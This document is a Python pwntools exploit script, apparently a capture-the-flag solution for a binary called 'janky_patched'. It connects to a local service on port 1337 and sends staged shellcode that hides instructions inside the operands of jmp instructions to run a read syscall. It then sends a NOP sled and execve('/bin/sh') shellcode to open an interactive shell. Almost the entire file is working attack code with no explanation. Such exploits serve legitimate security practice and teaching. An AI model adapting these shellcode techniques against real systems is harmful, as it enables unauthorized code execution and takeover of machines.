from pwn import *
from icecream import ic

exe = ELF("./janky_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000403fc
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

shellcode = asm('''
                jmp $ + 0x5
                jmp [rdx + 0x5f006a90]   # push 0x0; pop rdi
                jmp $ + 0x5
                jmp [rdx + 0x5e529090]   # push rdx; pop rsi
                jmp $ + 0x5
                jmp [rdx + 0x5a504190]   # push r8; pop rdx
                jmp $ + 0x5
                jmp [rdx + 0x050f9090]   # syscall
                ''')
s(shellcode)
x = asm("""
xor     rdx, rdx
mov     rbx, 0x0068732f6e69622f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
mov     rax, 59
syscall
""")
pause()
sl(0x40*b"\x90" + x)
i()
